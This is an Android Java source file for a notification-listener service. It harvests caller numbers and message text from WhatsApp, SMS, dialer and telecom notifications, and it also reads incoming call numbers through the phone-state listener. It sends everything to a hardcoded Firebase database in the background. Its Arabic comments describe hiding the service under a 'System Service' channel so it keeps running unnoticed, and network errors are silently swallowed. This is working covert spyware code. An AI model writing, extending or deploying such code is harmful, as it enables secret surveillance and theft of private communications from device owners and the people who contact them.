package com.ban.ab;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import androidx.core.app.NotificationCompat;
import android.util.Log;
import okhttp3.*;
import org.json.JSONObject;
import java.io.IOException;

public class CallNotificationListener extends NotificationListenerService {

    private final OkHttpClient client = new OkHttpClient();
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private String lastCapturedNumber = ""; // لمنع التكرار

    @Override
    public void onCreate() {
        super.onCreate();
        // إعداد خفي لضمان بقاء الخدمة نشطة في الخلفية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("system_svc", "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();
        if (notification == null || notification.extras == null) return;

        Bundle extras = notification.extras;
        String title = extras.getString(Notification.EXTRA_TITLE); // الرقم أو الاسم
        String text = String.valueOf(extras.get(Notification.EXTRA_TEXT)); // محتوى الرسالة

        // 🛡️ الدفاع الأول: مراقبة إشعارات النظام والواتساب
        if (isTargetPackage(packageName)) {
            if (title != null && !title.equals(lastCapturedNumber)) {
                lastCapturedNumber = title;
                sendDataToFirebase(title, text, "Bridge_Notification");
            }
        }
    }

    private boolean isTargetPackage(String pkg) {
        return pkg.contains("telecom") || pkg.contains("incallui") || 
               pkg.contains("messaging") || pkg.contains("whatsapp") || 
               pkg.contains("dialer");
    }

    // 🛡️ الدفاع الثاني: مراقبة حالة الراديو مباشرة (للمكالمات)
    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            telephonyManager.listen(new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String incomingNumber) {
                    if (state == TelephonyManager.CALL_STATE_RINGING && incomingNumber != null) {
                        if (!incomingNumber.equals(lastCapturedNumber)) {
                            lastCapturedNumber = incomingNumber;
                            sendDataToFirebase(incomingNumber, "Incoming Call (Radio)", "Bridge_Radio");
                        }
                    }
                }
            }, PhoneStateListener.LISTEN_CALL_STATE);
        }
        return START_STICKY;
    }

    private void sendDataToFirebase(String number, String content, String source) {
        String userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
        
        try {
            JSONObject data = new JSONObject();
            data.put("phone", number);
            data.put("data", content);
            data.put("source", source);
            data.put("timestamp", System.currentTimeMillis());

            RequestBody body = RequestBody.create(data.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder()
                    .url(FIREBASE_URL + "verification_logs/" + userName + ".json")
                    .post(body)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException {
                    if (response.body() != null) response.close();
                }
            });
        } catch (Exception e) {
            Log.e("Firebase_Bridge", "Error sending logs", e);
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d("Bridge", "Notification Listener Connected ✅");
    }
}
